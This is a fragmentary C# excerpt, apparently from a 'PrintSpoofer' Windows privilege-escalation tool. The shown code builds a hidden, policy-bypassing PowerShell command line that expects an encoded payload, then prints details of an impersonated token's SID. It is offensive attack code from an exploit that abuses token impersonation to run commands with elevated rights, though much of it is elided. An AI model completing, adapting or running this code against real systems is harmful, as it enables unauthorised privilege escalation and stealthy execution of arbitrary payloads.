...
namespace PrintSpoofer
{
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            ...
            string binToRun = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win hidden -nonI -noP -Exe ByPass -ENC ";
            ...
            // Print SID of impersonated token
            Console.WriteLine("[+] token opened: " + tokenHandle.ToString());
            ...
            Console.WriteLine("[+] token user sid address: " + TokenUser.User.Sid.ToString());
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            Console.WriteLine("[+] convert sid to string: " + ok.ToString());
            Console.WriteLine("[+] pstr: " + pstr.ToString());
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine("[+] sid string: " + sidstr);
